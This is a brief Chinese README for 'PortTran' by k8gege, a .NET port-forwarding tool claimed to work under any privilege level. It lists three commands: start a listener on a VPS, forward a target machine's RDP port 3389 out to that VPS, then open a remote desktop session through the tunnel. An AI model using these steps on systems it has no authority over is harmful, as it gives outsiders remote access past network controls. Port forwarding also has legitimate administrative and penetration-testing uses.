PortTran by k8gege<br>
.NET版端口转发工具 支持任意权限下转发<br> 

0x001 VPS监听
PortTranS.exe 8000 338

0x002 目标端口转发
PortTranC.exe 192.168.85.169 3389 192.168.85.142 8000

0x003 VPS连接3389
mstsc /console /v:127.0.0.1:338

